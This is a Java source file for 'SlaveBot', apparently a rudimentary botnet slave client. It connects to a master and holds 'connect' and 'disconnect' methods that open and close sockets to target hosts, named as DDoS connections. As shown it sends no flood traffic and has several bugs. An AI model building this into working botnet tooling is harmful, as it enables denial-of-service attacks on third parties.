import java.net.*;
import java.util.*;
import java.io.*;

public class SlaveBot
{
	//variable declarations
	static ArrayList<Socket> connectedToRemoteHost = new ArrayList<>();
	Socket DDoS;
	
	// main
	public static void main(String[] args) 
	{
		int port = 0;
		String ip = null;
		
		//for connection done for the first time
		if(args.length != 0)
		{
			//input format example = "java SlaveBot -h localhost -p 9999"
			if (args.length == 4) 
			{
				ip = args[1];
				port = Integer.parseInt(args[3]);
			}
			
			//input format example = "java SlaveBot -h localhost 9999"
			else if(args.length == 3)
			{
				ip = args[1];
				port = Integer.parseInt(args[2]);
			}
			
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("Connected To Server" + client.getRemoteSocketAddress());
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
		
		//for connection done by the command line
		while(true)
		{
			Scanner reader = new Scanner(System.in);
			String line = reader.nextLine();
			String[] dataArray = line.split("\\s+");
			
			// loop if no data is entered
			if (line.equals("")) 
			{
				continue;
			}
			// display ArrayList of Clients
			else if (line.equalsIgnoreCase("connectedToRemoteHost")) 
			{
				System.out.println(connectedToRemoteHost);
				continue;
			}
			//exit function logic
			else if (line.equalsIgnoreCase("exit") || line.equalsIgnoreCase("quit") || line.equalsIgnoreCase("-1"))
			{
				System.out.println("Program Terminated.");
				System.exit(0);
			}
			// input format example = -h localhost -p 9999
			else if(dataArray.length == 4)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[3]);
			}
			//input format example = -h localhost 9999
			else if(dataArray.length == 3)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[2]);
			}
			//for random input format
			else
			{
				System.out.println(dataArray);
				System.out.println("in else");
				continue;
			}
			
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("Connected To Server" + client.getRemoteSocketAddress());
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
	}
	//main
	//-----------------------------------------------------------------------------------------------------------------------------------------------
	//connect
	public void connect(Socket selectedSlave, String targetIP, int targetPort) throws IOException
	{
		try
		{
			DDoS = new Socket();
			DDoS.connect(new InetSocketAddress(targetIP, targetPort));
			if(DDoS.isConnected())
			{
				connectedToRemoteHost.add(DDoS);
				System.out.println("Client " + selectedSlave.getRemoteSocketAddress() + " connected to " + DDoS.getInetAddress() + " using port " + DDoS.getPort());
			}
			
		} catch(IOException e)
		{
			System.out.println("Connection Lost.");
			e.printStackTrace();
		}
	}
	//connect
	//-----------------------------------------------------------------------------------------------------------------------------------------------
	//disconnect
	public void disconnect(Socket selectedSlave, String targetIPAddress, int targetPort) throws IOException
	{
		try
		{
			System.out.println(connectedToRemoteHost + "\n\n");
			System.out.println(selectedSlave.getLocalPort() + "\n\n");
			for(int i=0; i<connectedToRemoteHost.size(); i++)
			{
				if(connectedToRemoteHost.get(i).getLocalPort() == selectedSlave.getLocalPort())
				{
						System.out.println("Connection to "+connectedToRemoteHost.get(i).getRemoteSocketAddress()+" "+connectedToRemoteHost.get(i).getLocalPort()+" is closed.");
						connectedToRemoteHost.get(i).close();
						connectedToRemoteHost.remove(i);
						break;
				}
			}
			
		} catch(IOException e)
		{
			System.out.println("Disconnection Failure.");
			e.printStackTrace();
		}
	}
	//disconnect
}
